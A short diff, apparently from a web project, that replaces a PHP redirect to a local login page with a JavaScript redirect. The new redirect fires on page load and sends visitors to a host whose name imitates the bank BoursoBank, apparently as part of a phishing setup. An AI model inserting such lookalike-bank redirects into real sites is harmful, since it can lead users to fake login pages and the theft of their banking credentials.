@@ -1,5 +1,4 @@
-<?php
+<script>
+window.location.href = "https://boursobank.osc-fr1.scalingo.io/";
+</script>
 
-session_start();
-header('location: connexion.php');
-?>
